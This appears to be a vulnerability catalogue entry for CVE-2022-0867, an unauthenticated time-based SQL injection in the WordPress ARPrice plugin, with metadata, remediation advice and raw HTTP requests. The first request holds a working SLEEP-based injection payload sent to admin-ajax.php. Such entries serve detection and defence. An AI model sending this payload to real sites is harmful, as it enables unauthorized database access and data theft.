---
layout: post
cve_id: CVE-2022-0867
title: WordPress ARPrice <3.6.1 - SQL Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-0867.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-0867.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: critical
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary SQL queries, potentially leading to unauthorized accessand data
  leakage.

  '
remediation: 'Update to the latest version of ARPrice plugin (3.6.1) or apply the
  vendor-provided patch.

  '
reference:
- https://wpscan.com/vulnerability/62803aae-9896-410b-9398-3497a838e494
- https://wordpress.org/plugins/arprice-responsive-pricing-table/
- https://nvd.nist.gov/vuln/detail/CVE-2022-0867
- https://github.com/20142995/sectool
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-0867
  cwe-id: CWE-89
  epss-score: 0.87685
  epss-percentile: 0.9944
  cpe: cpe:2.3:a:reputeinfosystems:pricing_table:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: reputeinfosystems
  product: pricing_table
  framework: wordpress
tags:
- time-based-sqli
- cve
- cve2022
- unauth
- wp
- wordpress
- wp-plugin
- arprice-responsive-pricing-table
- sqli
- wpscan
- reputeinfosystems
- vkev
- vuln
---

## ðŸ” Vulnerability Description
WordPress ARPrice plugin prior to 3.6.1 contains a SQL injection vulnerability. It fails to properly sanitize and escape user supplied POST data before being inserted in an SQL statement and executed via an AJAX action. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
Connection: close
Content-Length: 107
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
action=arplite_insert_plan_id&arp_plan_id=x&arp_template_id=1+AND+(SELECT+8948+FROM+(SELECT(SLEEP(6)))iIic)
```

```nohighlight
GET /wp-content/plugins/arprice-responsive-pricing-table/js/arprice.js HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.14
Connection: close
Accept-Encoding: gzip
```

